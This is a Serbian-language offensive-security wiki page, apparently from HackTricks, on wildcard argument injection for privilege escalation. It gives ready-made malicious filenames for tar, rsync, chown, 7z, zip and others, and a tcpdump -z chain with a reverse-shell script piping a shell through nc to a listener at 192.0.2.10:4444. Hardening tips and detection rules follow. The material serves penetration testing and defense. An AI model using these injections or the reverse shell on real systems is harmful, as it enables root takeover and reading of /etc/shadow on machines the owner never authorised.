# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (poznat i kao *glob*) **injekcija argumenata** se dešava kada privilegovani skript pokrene Unix binarni fajl kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, … sa nequoted wildcard-om kao što je `*`.
> Pošto ljuska širi wildcard **pre** izvršavanja binarnog fajla, napadač koji može da kreira fajlove u radnom direktorijumu može da napravi imena fajlova koja počinju sa `-` tako da se tumače kao **opcije umesto podataka**, efikasno krijući proizvoljne zastavice ili čak komande.
> Ova stranica prikuplja najkorisnije primitivne tehnike, nedavna istraživanja i moderne detekcije za 2023-2025.

## chown / chmod

Možete **kopirati vlasnika/grupu ili dozvole bitova proizvoljnog fajla** zloupotrebom `--reference` zastavice:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kada root kasnije izvrši nešto poput:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` je ubačen, uzrokujući da *svi* odgovarajući fajlovi naslede vlasništvo/dozvole `/root/secret``file`.

*PoC & alat*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinovani napad).  
Pogledajte i klasični DefenseCode rad za detalje.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Izvršite proizvoljne komande zloupotrebom **checkpoint** funkcije:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Kada root pokrene npr. `tar -czf /root/backup.tgz *`, `shell.sh` se izvršava kao root.

### bsdtar / macOS 14+

Podrazumevani `tar` na novijim macOS (zasnovan na `libarchive`) *ne* implementira `--checkpoint`, ali i dalje možete postići izvršavanje koda sa **--use-compress-program** flagom koji vam omogućava da navedete spoljašnji kompresor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Kada privilegovani skript pokrene `tar -cf backup.tar *`, `/bin/sh` će biti pokrenut.

---

## rsync

`rsync` vam omogućava da prepravite udaljenu ljusku ili čak udaljeni binarni fajl putem komandnih opcija koje počinju sa `-e` ili `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ako root kasnije arhivira direktorijum sa `rsync -az * backup:/srv/`, injektovana zastavica pokreće vašu ljusku na udaljenoj strani.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mod).

---

## 7-Zip / 7z / 7za

Čak i kada privilegovani skript *defensivno* dodaje prefiks `--` ispred wildcard-a (da zaustavi parsiranje opcija), 7-Zip format podržava **datoteke sa listom datoteka** dodavanjem `@` ispred imena datoteke. Kombinovanje toga sa simboličkom vezom omogućava vam da *ekfiltrirate proizvoljne datoteke*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ako root izvrši nešto poput:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip će pokušati da pročita `root.txt` (→ `/etc/shadow`) kao listu fajlova i odustati, **štampajući sadržaj na stderr**.

---

## zip

`zip` podržava flag `--unzip-command` koji se prosleđuje *verbatim* sistemskoj ljusci kada će se arhiva testirati:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injectujte zastavicu putem kreiranog imena datoteke i sačekajte da privilegovani skript za pravljenje rezervnih kopija pozove `zip -T` (testiranje arhive) na rezultantnoj datoteci.

---

## Dodatni binarni programi ranjivi na injekciju wildcards (brza lista 2023-2025)

Sledeće komande su zloupotrebljavane u modernim CTF-ovima i stvarnim okruženjima. Teret je uvek kreiran kao *ime datoteke* unutar pisive direktorijuma koji će kasnije biti obrađen sa wildcard-om:

| Binarni program | Zastavica za zloupotrebu | Efekat |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → proizvoljni `@file` | Čitanje sadržaja datoteke |
| `flock` | `-c <cmd>` | Izvršavanje komande |
| `git`   | `-c core.sshCommand=<cmd>` | Izvršavanje komande putem git-a preko SSH |
| `scp`   | `-S <cmd>` | Pokretanje proizvoljnog programa umesto ssh |

Ove primitivne komande su manje uobičajene od klasičnih *tar/rsync/zip*, ali ih vredi proveriti prilikom lova.

---

## tcpdump rotacione kuke (-G/-W/-z): RCE putem argv injekcije u omotačima

Kada ograničena ljuska ili omotač dobavljača gradi `tcpdump` komandnu liniju konkatenacijom polja pod kontrolom korisnika (npr., parametar "ime datoteke") bez stroge citacije/validacije, možete prokrijumčariti dodatne `tcpdump` zastavice. Kombinacija `-G` (rotacija zasnovana na vremenu), `-W` (ograničenje broja datoteka) i `-z <cmd>` (komanda nakon rotacije) dovodi do proizvoljnog izvršavanja komande kao korisnik koji pokreće tcpdump (često root na uređajima).

Preduslovi:

- Možete uticati na `argv` prosleđen `tcpdump`-u (npr., putem omotača kao što je `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Omotač ne sanitizuje razmake ili `-`-prefiksirane tokene u polju imena datoteke.

Klasični PoC (izvršava skriptu za obrnuti shell iz pisivog puta):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalji:

- `-G 1 -W 1` prisiljava trenutnu rotaciju nakon prvog odgovarajućeg paketa.
- `-z <cmd>` pokreće post-rotacionu komandu jednom po rotaciji. Mnogi buildovi izvršavaju `<cmd> <savefile>`. Ako je `<cmd>` skripta/interpreter, osigurajte da obrada argumenata odgovara vašem payload-u.

Varijante bez uklonjivih medija:

- Ako imate bilo koju drugu primitivnu metodu za pisanje fajlova (npr. poseban komandni omotač koji omogućava preusmeravanje izlaza), stavite svoju skriptu u poznatu putanju i aktivirajte `-z /bin/sh /path/script.sh` ili `-z /path/script.sh` u zavisnosti od platformskih semantika.
- Neki omotači dobavljača rotiraju na lokacije koje kontroliše napadač. Ako možete uticati na rotiranu putanju (symlink/direktorijum), možete usmeriti `-z` da izvrši sadržaj koji potpuno kontrolišete bez spoljnog medija.

Saveti za učvršćivanje za dobavljače:

- Nikada ne prosledite stringove koje kontroliše korisnik direktno `tcpdump`-u (ili bilo kom alatu) bez strogo definisanih lista dozvoljenih. Citirajte i validirajte.
- Ne izlažite funkcionalnost `-z` u omotačima; pokrenite tcpdump sa fiksnim sigurnim šablonom i potpuno zabranite dodatne zastavice.
- Smanjite privilegije tcpdump-a (samo cap_net_admin/cap_net_raw) ili pokrenite pod posvećenim korisnikom bez privilegija uz AppArmor/SELinux ograničenje.


## Detekcija i učvršćivanje

1. **Onemogućite shell globbing** u kritičnim skriptama: `set -f` (`set -o noglob`) sprečava ekspanziju wildcards.
2. **Citirajte ili escape-ujte** argumente: `tar -czf "$dst" -- *` *nije* sigurno — preferirajte `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Eksplicitne putanje**: Koristite `/var/www/html/*.log` umesto `*` tako da napadači ne mogu kreirati susedne fajlove koji počinju sa `-`.
4. **Najmanje privilegije**: Pokrećite backup/održavanje poslove kao uslugu bez privilegija umesto kao root kad god je to moguće.
5. **Monitoring**: Elastic-ovo unapred izgrađeno pravilo *Potencijalni shell putem wildcard injekcije* traži `tar --checkpoint=*`, `rsync -e*`, ili `zip --unzip-command` odmah praćeno shell podprocesom. EQL upit se može prilagoditi za druge EDR-ove.

---

## Reference

* Elastic Security – Pravilo Detektovano *Potencijalni shell putem wildcard injekcije* (poslednje ažurirano 2025)
* Rutger Flohil – “macOS — Tar wildcard injekcija” (18. decembar 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
